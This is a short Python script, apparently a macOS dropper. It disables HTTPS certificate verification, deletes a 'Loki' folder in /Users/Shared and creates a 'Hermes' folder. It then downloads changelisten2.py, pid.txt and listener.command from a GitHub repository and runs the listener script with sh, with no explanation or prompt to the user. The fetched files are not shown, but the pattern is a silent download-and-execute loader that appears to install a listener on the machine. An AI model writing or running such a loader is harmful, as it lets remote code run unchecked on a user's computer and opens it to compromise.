import shutil
import os
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

try:
  shutil.rmtree ('/Users/Shared/Loki')
except:
  pass

try:
  os.mkdir ('/Users/Shared/Hermes')
  import time
  time.sleep (1.5)
  os.system ("""/usr/local/bin/python -c 'import ssl; ssl._create_default_https_context = ssl._create_unverified_context; import time; time.sleep (1); import urllib; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/changelisten2.py", "/Users/Shared/Hermes/changelisten2.py"); urllib.urlretrieve ("https:\
//github.com/3-TA/Loki/raw/main/pid.txt", "/Users/Shared/Hermes/pid.txt"); urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/listener.command", "/Users/Shared/Hermes/listener.command")'""")
  time.sleep (2)
  os.system ('sh /Users/Shared/Hermes/listener.command')
except Exception as e:
  print (e)
